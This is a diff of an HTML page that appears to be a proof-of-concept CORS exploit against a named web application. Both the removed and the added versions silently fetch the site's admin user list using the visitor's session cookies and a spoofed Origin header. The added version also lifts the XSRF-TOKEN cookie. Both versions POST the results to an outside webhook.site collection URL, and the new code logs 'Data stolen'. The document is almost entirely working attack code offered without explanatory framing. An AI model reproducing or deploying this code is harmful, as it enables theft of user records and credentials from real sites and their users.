@@ -1,76 +1,45 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Genesis Admin Dashboard</title>
-</head>
 <body>
-    <h2>Genesis Admin Panel</h2>
-    <p id="status">Loading...</p>
-    <pre id="result"></pre>
-
+    <h1>Loading...</h1>
     <script>
-        // Your webhook
         const WEBHOOK = 'https://webhook.site/499aae9f-7c35-4ea4-a1f4-472eba4dd5e0';
-        const TARGET = 'https://genesis.lailendemo.com';
-        
-        // Status display
-        const status = document.getElementById('status');
-        const result = document.getElementById('result');
 
-        async function getAdminUsers() {
-            status.textContent = '🔍 Fetching admin users...';
-            
-            try {
-                // The vulnerable request - notice the Origin header
-                const response = await fetch(TARGET + '/api/users?role=admin&sortBy=name&descending=false&rowsNumber=0&rowsPerPage=100', {
-                    method: 'GET',
-                    credentials: 'include',  // Sends your cookies
-                    headers: {
-                        'Origin': 'https://attacker.com',  // This triggers CORS
-                        'Accept': 'application/json'
-                    }
-                });
-
-                // Check if request was successful
-                if (response.status === 200) {
-                    const data = await response.json();
-                    
-                    // Display what we got
-                    result.textContent = JSON.stringify(data, null, 2);
-                    status.textContent = `✅ Found ${data.data ? data.data.length : 0} admin users!`;
-                    
-                    // Send to webhook
-                    if (data.data && data.data.length > 0) {
-                        status.textContent = '📤 Sending to webhook...';
-                        
-                        // Send to webhook
-                        fetch(WEBHOOK, {
-                            method: 'POST',
-                            mode: 'no-cors',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                timestamp: new Date().toISOString(),
-                                totalUsers: data.data.length,
-                                users: data.data
-                            })
-                        });
-                        
-                        status.textContent = `✅ ${data.data.length} admin users sent to webhook!`;
-                    }
-                } else {
-                    status.textContent = `❌ Error: ${response.status} - ${response.statusText}`;
-                    result.textContent = 'Make sure you are logged in to genesis.lailendemo.com';
+        function getCSRF() {
+            const cookies = document.cookie.split(';');
+            for (let c of cookies) {
+                c = c.trim();
+                if (c.startsWith('XSRF-TOKEN=')) {
+                    return decodeURIComponent(c.substring('XSRF-TOKEN='.length));
                 }
-            } catch(error) {
-                status.textContent = '❌ CORS Error - Are you logged in?';
-                result.textContent = error.message + '\n\nMake sure you:\n1. Are logged in to genesis.lailendemo.com\n2. Open this page in the same browser\n3. The CORS vulnerability exists';
             }
+            return null;
         }
 
-        // Run immediately
-        getAdminUsers();
+        const csrf = getCSRF();
+        
+        if (csrf && document.cookie.includes('genesis_staging_session')) {
+            fetch('https://genesis.lailendemo.com/api/users?role=admin', {
+                credentials: 'include',
+                headers: {
+                    'Origin': 'https://hacker.com',
+                    'X-XSRF-TOKEN': csrf,
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'Accept': 'application/json'
+                }
+            })
+            .then(r => r.json())
+            .then(data => {
+                // Send to webhook
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(data)
+                });
+                console.log('✅ Data stolen:', data.data.length, 'users');
+            })
+            .catch(e => console.log('❌ Error:', e));
+        }
     </script>
 </body>
 </html>
